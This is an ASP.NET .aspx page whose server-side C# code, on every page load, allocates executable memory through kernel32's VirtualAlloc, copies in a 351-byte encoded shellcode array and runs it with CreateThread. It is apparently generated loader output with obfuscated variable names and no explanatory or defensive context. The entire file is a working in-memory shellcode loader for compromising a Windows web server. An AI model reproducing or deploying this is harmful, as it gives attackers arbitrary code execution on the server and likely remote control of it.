<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] qrUKzCQZkv = new byte[351] {
0xbe,0x9f,0x9f,0x94,0xf0,0xdd,0xc4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x52,0x83,0xc0,0x04,0x31,0x70,0x0e,0x03,0xef,0x91,
0x76,0x05,0xf3,0x46,0xf4,0xe6,0x0b,0x97,0x99,0x6f,0xee,0xa6,0x99,0x14,0x7b,0x98,0x29,0x5e,0x29,0x15,0xc1,0x32,0xd9,0xae,0xa7,
0x9a,0xee,0x07,0x0d,0xfd,0xc1,0x98,0x3e,0x3d,0x40,0x1b,0x3d,0x12,0xa2,0x22,0x8e,0x67,0xa3,0x63,0xf3,0x8a,0xf1,0x3c,0x7f,0x38,
0xe5,0x49,0x35,0x81,0x8e,0x02,0xdb,0x81,0x73,0xd2,0xda,0xa0,0x22,0x68,0x85,0x62,0xc5,0xbd,0xbd,0x2a,0xdd,0xa2,0xf8,0xe5,0x56,
0x10,0x76,0xf4,0xbe,0x68,0x77,0x5b,0xff,0x44,0x8a,0xa5,0x38,0x62,0x75,0xd0,0x30,0x90,0x08,0xe3,0x87,0xea,0xd6,0x66,0x13,0x4c,
0x9c,0xd1,0xff,0x6c,0x71,0x87,0x74,0x62,0x3e,0xc3,0xd2,0x67,0xc1,0x00,0x69,0x93,0x4a,0xa7,0xbd,0x15,0x08,0x8c,0x19,0x7d,0xca,
0xad,0x38,0xdb,0xbd,0xd2,0x5a,0x84,0x62,0x77,0x11,0x29,0x76,0x0a,0x78,0x26,0xbb,0x27,0x82,0xb6,0xd3,0x30,0xf1,0x84,0x7c,0xeb,
0x9d,0xa4,0xf5,0x35,0x5a,0xca,0x2f,0x81,0xf4,0x35,0xd0,0xf2,0xdd,0xf1,0x84,0xa2,0x75,0xd3,0xa4,0x28,0x85,0xdc,0x70,0xfe,0xd5,
0x72,0x2b,0xbf,0x85,0x32,0x9b,0x57,0xcf,0xbc,0xc4,0x48,0xf0,0x16,0x6d,0xe2,0x0b,0xf1,0x52,0x5b,0x22,0xf1,0x3b,0x9e,0x44,0xf0,
0x06,0x17,0xa2,0x98,0x68,0x7e,0x7d,0x35,0x10,0xdb,0xf5,0xa4,0xdd,0xf1,0x70,0xe6,0x56,0xf6,0x85,0xa9,0x9e,0x73,0x95,0x5e,0x6f,
0xce,0xc7,0xc9,0x70,0xe4,0x6f,0x95,0xe3,0x63,0x6f,0xd0,0x1f,0x3c,0x38,0xb5,0xee,0x35,0xac,0x2b,0x48,0xec,0xd2,0xb1,0x0c,0xd7,
0x56,0x6e,0xed,0xd6,0x57,0xe3,0x49,0xfd,0x47,0x3d,0x51,0xb9,0x33,0x91,0x04,0x17,0xed,0x57,0xff,0xd9,0x47,0x0e,0xac,0xb3,0x0f,
0xd7,0x9e,0x03,0x49,0xd8,0xca,0xf5,0xb5,0x69,0xa3,0x43,0xca,0x46,0x23,0x44,0xb3,0xba,0xd3,0xab,0x6e,0x7f,0xe3,0xe1,0x32,0xd6,
0x6c,0xac,0xa7,0x6a,0xf1,0x4f,0x12,0xa8,0x0c,0xcc,0x96,0x51,0xeb,0xcc,0xd3,0x54,0xb7,0x4a,0x08,0x25,0xa8,0x3e,0x2e,0x9a,0xc9,
0x6a };

        IntPtr mEiKvfP3N = VirtualAlloc(IntPtr.Zero,(UIntPtr)qrUKzCQZkv.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(qrUKzCQZkv,0,mEiKvfP3N,qrUKzCQZkv.Length);
        IntPtr xGg9Q2P4Bb = IntPtr.Zero;
        IntPtr pQZg9L = CreateThread(IntPtr.Zero,UIntPtr.Zero,mEiKvfP3N,IntPtr.Zero,0,ref xGg9Q2P4Bb);
    }
</script>
